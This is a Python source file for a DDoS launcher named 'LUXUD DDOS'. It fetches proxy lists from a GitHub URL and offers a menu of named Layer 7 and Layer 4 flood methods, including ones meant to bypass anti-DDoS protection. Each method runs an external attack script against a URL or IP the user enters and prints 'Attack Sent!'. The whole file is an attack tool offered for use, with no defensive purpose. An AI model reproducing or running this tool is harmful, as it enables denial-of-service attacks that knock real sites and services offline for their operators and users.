import os
import requests
import random
import time
from time import sleep

def proxy():
    path = os.getcwd()
    filep = os.path.join(path)
    b1 = requests.get('https://raw.githubusercontent.com/duongpokee/adjhasjlfhk/main/asdasfahttp')
    with open(filep + '\data\proxy.txt','wb') as file2:
            file2.write(b1.content)
            time.sleep(1)
    with open(filep + '\data\proxies.txt','wb') as file2:
            file2.write(b1.content)
            time.sleep(1)
    with open(filep + '\data\http.txt','wb') as file2:
            file2.write(b1.content)
            time.sleep(1)
    print("Succesfully !")

def home():
    os.system('cls' if os.name == 'nt' else 'clear')
    print('LUXUD DDOS')
    print('USE METHODS TO DDOS')
    print('USE PROXY TO GET PROXY')
    main()

def main():
    while(True):
        cnc = input('Input: ')
        if cnc == "METHODS" or cnc == "methods" or cnc == "Methods":
            meth()
        elif cnc == "PROXY" or cnc == "proxy" or cnc == "Proxy":
            proxy()
        elif "http-raw" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            os.system(f"node ./data/HTTP-RAW.js {url} {time}")
        elif "http-rand" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-RAND.js {url} {time}")
        elif "http-socket" in cnc:
            url = input("Url: ")
            threads = input("Threads: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-SOCKETS.js {url} {threads} {time}")
        elif "http-mix" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/HTTP-MIX.js {url} {time} ')
        elif "http-bypass" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-BYPASS.js {url} {time}")
        elif "http-uam" in cnc:
            url = input("Url: ")
            method = input("Method: ")
            time = input("Time: ")
            thread = input("Thread: ")
            rate = input("Rate: ")
            print('Attack Sent!')
            os.system(f"node ./data/HTTP-UAM.js {method} {thread} {url} {time} {rate}")
        elif "https1" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/https1.js {url} 10 2000 {time}")
        elif "tls-v1" in cnc:
            url = input("Url: ")
            port = input("Port: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/tls.js {url} {port} {time}")
        elif "tls-v2" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/tlsv2.js {url} {time}')
            print('Attack Sent!')
        elif "browser" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            thread = input("Threads: ")
            print('Attack Sent!')
            os.system(f'node ./data/BROWSER.js {url} {time} {thread} proxy.txt')
            print('Attack Sent!')
        elif "hyper" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/hyper.js {url} {time}")
        elif "slow" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f"node ./data/slow.js {url} {time}")
        elif "bypassuam" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            threads = input("Threads: ")
            os.system(f'node ./data/bypassuam.js GET {url} {threads} {time} 100')
        elif "ce-mix" in cnc:
            url = input("Url: ")
            time = input("Time: ")
            print('Attack Sent!')
            os.system(f'node ./data/CE-MIX.js {url} {time} ')
        elif "sever" in cnc:
            url = input("Url: ")
            method = input("Method: ")
            print('Attack Sent!')
            os.system(f'go run ./data/sever.go -site {url} {method}')
        elif "tcp" in cnc:
            ip = input("Ip: ")
            port = input("Port: ")
            method = input("Method: ")
            time = input("Time: ")
            conns = input("Thread: ")
            os.system(f'./data/./100UP-TCP {method} {ip} {port} {time} {conns}')
        elif "udp" in cnc:
            ip = input("Ip: ")
            port = input("Port: ")
            method = input("Method: ")
            time = input("Time: ")
            conns = input("Thread: ")
            os.system(f'./data/./100UP-TCP {method} {ip} {port} {time} {conns}')
        elif "destroy" in cnc:
            ip = input("Ip: ")
            port = input("Port: ")
            time = input("Time: ")
            os.system(f'perl ./data/destroy.pl {ip} {port} 65500 {time}')
        elif "god" in cnc:
            ip = input("Ip: ")
            port = input("Port: ")
            time = input("Time: ")
            os.system(f'perl ./data/god.pl {ip} {port} 65500 {time}')
        elif "flood" in cnc:
            os.system(f'python3 ./data/flood.py')
        else:
            try:
                cmd=cnc.split()[0]
                print("Command : [ "+cmd+" ] Not Found!!")
            except IndexError:
                pass

def meth():
    os.system('cls' if os.name == 'nt' else 'clear')
    print("=====LAYER7=====")
    print("►http-raw")
    print("►http-rand")
    print("►http-socket")
    print("►http-mix")
    print("►http-bypass")
    print("►https1")
    print("►tls-v1")
    print("►tls-v2")
    print("►browser")
    print("►hyper")
    print("►slow")
    print("►bypassuam")
    print("►ce-mix")
    print("►sever")
    print("=====LAYER4=====")
    print("►flood")
    print("►tcp")
    print("►udp")
    print("►destroy")
    print("►god")
home()


